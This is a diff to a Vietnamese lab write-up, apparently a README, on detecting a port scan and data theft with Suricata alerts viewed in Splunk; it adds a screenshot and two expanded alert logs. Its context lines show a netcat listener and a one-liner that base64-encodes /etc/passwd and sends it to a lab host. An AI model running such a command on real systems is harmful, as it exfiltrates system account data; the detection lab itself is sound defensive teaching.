@@ -133,19 +133,39 @@ nc -lvnp 5555
 cat /etc/passwd | base64 | nc 192.168.0.30 5555
 ```
 
+<img width="786" height="697" alt="image" src="https://github.com/user-attachments/assets/c4c39ad2-e47f-4eb4-988b-244d2d00253e" />
+
 ### Bước 5: Phân tích log
 
-1. Log của Nmap
+1. Log của hành vi quét cổng
 
 ```
 { [-]
-   alert: { [+]
+   alert: { [-]
+     action: allowed
+     category: Potentially Bad Traffic
+     gid: 1
+     metadata: { [+]
+     }
+     rev: 3
+     severity: 2
+     signature: ET SCAN Suspicious inbound to Oracle SQL port 1521
+     signature_id: 2010936
    }
    dest_ip: 192.168.0.20
    dest_port: 1521
    direction: to_server
    event_type: alert
-   flow: { [+]
+   flow: { [-]
+     bytes_toclient: 0
+     bytes_toserver: 60
+     dest_ip: 192.168.0.20
+     dest_port: 1521
+     pkts_toclient: 0
+     pkts_toserver: 1
+     src_ip: 192.168.0.30
+     src_port: 47182
+     start: 2026-03-02T23:28:23.155291+0700
    }
    flow_id: 2074347087003202
    in_iface: ens33
@@ -158,6 +178,52 @@ cat /etc/passwd | base64 | nc 192.168.0.30 5555
 }
 
     alert.signature = ET SCAN Suspicious inbound to Oracle SQL port 1521
+    host = hoang
+    source = /var/log/suricata/eve.json
+    sourcetype = suricata
+```
+
+2. Log của hành vi trích xuất thông tin nhạy cảm
+
+```
+{ [-]
+   alert: { [-]
+     action: allowed
+     category: Attempted User Privilege Gain
+     gid: 1
+     metadata: { [+]
+     }
+     rev: 2
+     severity: 1
+     signature: ET EXPLOIT bin bash base64 encoded Remote Code Execution 2
+     signature_id: 2025805
+   }
+   dest_ip: 192.168.0.30
+   dest_port: 5555
+   direction: to_server
+   event_type: alert
+   flow: { [-]
+     bytes_toclient: 140
+     bytes_toserver: 5373
+     dest_ip: 192.168.0.30
+     dest_port: 5555
+     pkts_toclient: 2
+     pkts_toserver: 6
+     src_ip: 192.168.0.20
+     src_port: 57148
+     start: 2026-03-02T23:38:11.100656+0700
+   }
+   flow_id: 995265164925303
+   in_iface: ens33
+   ip_v: 4
+   pkt_src: wire/pcap
+   proto: TCP
+   src_ip: 192.168.0.20
+   src_port: 57148
+   timestamp: 2026-03-02T23:38:11.137019+0700
+}
+
+    alert.signature = ET EXPLOIT bin bash base64 encoded Remote Code Execution 2
     host = hoang
     source = /var/log/suricata/eve.json
     sourcetype = suricata
